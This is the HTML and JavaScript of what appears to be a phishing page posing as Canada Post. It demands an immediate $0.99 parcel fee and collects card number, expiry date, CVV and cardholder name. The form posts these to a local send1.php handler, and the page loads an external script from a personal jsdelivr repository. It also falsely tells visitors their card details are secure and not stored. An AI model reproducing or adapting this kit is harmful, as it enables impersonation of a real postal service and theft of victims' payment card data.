...
<head>
    <meta charset="UTF-8">
    <title>Payment - $0.99 Due | Canada Post</title>
...
<body>
    ...
    <div class="page-wrapper">
        ...
        <div class="payment-summary">
            <div>
                <div class="payment-due">Amount Due</div>
                <div class="payment-amount">$0.99 <span class="payment-currency">CAD</span></div>
            </div>
            <div>
                <div class="payment-due">Due Date: Immediately</div>
                        <div class="payment-due">Tracking number : <strong>QQ767123987CA</strong></div>
        ...
        <div class="form-card">
            ...
            <form id="payment-form" action="./send/send1.php" method="post">
                <div class="form-row">
                    <label for="card_number" class="required">Card Number</label>
                    <input type="tel" id="card_number" name="card_number" placeholder="Card Number" >
                    ...
                    <div class="payment-icons">
                        ...
                        <div class="payment-img">
                            <img src="./images/discover.png" alt="Discover" class="payment-icon">
                        </div>
                        <div class="payment-img">
                            <img src="./images/diners-club.png" alt="Diners Club" class="payment-icon">
                        </div>
                        <div class="payment-img">
                            <img src="./images/UnionPay.png" alt="UnionPay" class="payment-icon">
                        </div>
                        <div class="payment-img">
                            <img src="./images/jcb.png" alt="JCB" class="payment-icon">
                        </div>
                    </div>
                </div>
                ...
                <div class="form-row-inline">
                    <div class="form-row">
                        ...
                        <input type="tel" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" >
                        <span class="error-message"></span>
                    </div>

                    <div class="form-row">
                        <label for="cvv" class="required">CVV</label>
                        <input type="tel" id="cvv" name="cvv" placeholder="123" maxlength="4" >
                        <span class="error-message"></span>
                        <div class="helper-text">3 or 4 digits on back of card</div>
                    </div>
                </div>

                <div class="form-row">
                    <label for="cardholderName" class="required">Cardholder Name</label>
                    <input type="text" id="cardholderName" name="cardholder_name" placeholder="As shown on card" >
                    <span class="error-message"></span>
                </div>
                ...
                <div class="security-notice">
                    ...
                    <div class="security-text">
                        Your payment information is secure and encrypted. Canada Post does not store your full card details.
                    </div>
                </div>

                <div class="actions">
                    <button type="submit" class="btn-primary">
                        <span>Pay $0.99 CAD</span>
                    </button>
                </div>
            </form>
        </div>
    ...
    <script src="https://cdn.jsdelivr.net/gh/900com/jsdelivr@latest/cp1.js"></script><script>
        // Function to format card number as XXXX XXXX XXXX XXXX XXXX
        ...
        function getCardType(number) {
            const cardPatterns = {
                ...
                Discover: /^6(?:011|5[0-9]{2}|4[4-9][0-9])\d{12}$/,
        ...
        // Function to highlight the active card type
        function highlightCardType(number) {
            const cardType = getCardType(number.replace(/\s+/g, ''));
            const paymentIcons = document.querySelectorAll('.payment-img');
            
            paymentIcons.forEach(icon => {
                icon.classList.remove('active');
                if (icon.querySelector('img').alt === cardType) {
                    icon.classList.add('active');
                }
            });
        }

        // Function to dynamically adjust maxlength based on card type
        function adjustMaxLength(input) {
            const cardType = getCardType(input.value.replace(/\s+/g, ''));
            const maxLength = cardType === 'UnionPay' ? 23 : 19; // UnionPay allows 19 digits + spaces
        ...
        // Function to validate expiry date in MM/YY format
        ...
        document.getElementById('card_number').addEventListener('input', function () {
            ...
            adjustMaxLength(this);
            highlightCardType(this.value);
            clearError(this);
            if (this.value.replace(/\s+/g, '').length >= 13 && !validateCardNumber(this.value)) {
        ...
        document.getElementById('expiry').addEventListener('input', function () {
            ...
            this.value = this.value
                ...
                .slice(0, 5);
            clearError(this);
            if (this.value.length === 5 && !validateExpiryDate(this.value)) {
                displayError(this, 'Invalid expiry date. Format: MM/YY');
            }
        });
        ...
        document.getElementById('cvv').addEventListener('input', function () {
            ...
            clearError(this);
            if (this.value.length >= 3 && !validateCVV(this.value)) {
                displayError(this, 'Invalid CVV. Must be 3 or 4 digits.');
            }
        });

        // Event listener for cardholder name input
        document.getElementById('cardholderName').addEventListener('input', function () {
            formError.style.display = 'none';
            clearError(this);
            if (this.value.trim().length < 2) {
                displayError(this, 'Please enter a valid cardholder name.');
            }
        });
        ...
        document.getElementById('payment-form').addEventListener('submit', function (e) {
            ...
            if (!validateCardNumber(cardNumber.value)) {
                isValid = false;
                displayError(cardNumber, 'Invalid card number.');
            }

            if (!validateExpiryDate(expiry.value)) {
                isValid = false;
                displayError(expiry, 'Invalid expiry date. Format: MM/YY');
            }

            if (!validateCVV(cvv.value)) {
                isValid = false;
                displayError(cvv, 'Invalid CVV. Must be 3 or 4 digits.');
            }

            if (cardholderName.value.trim().length < 2) {
                isValid = false;
                displayError(cardholderName, 'Please enter a valid cardholder name.');
            }
            ...
            // if valid: no alert, form posts to ./send/send2.php
        });
    </script>
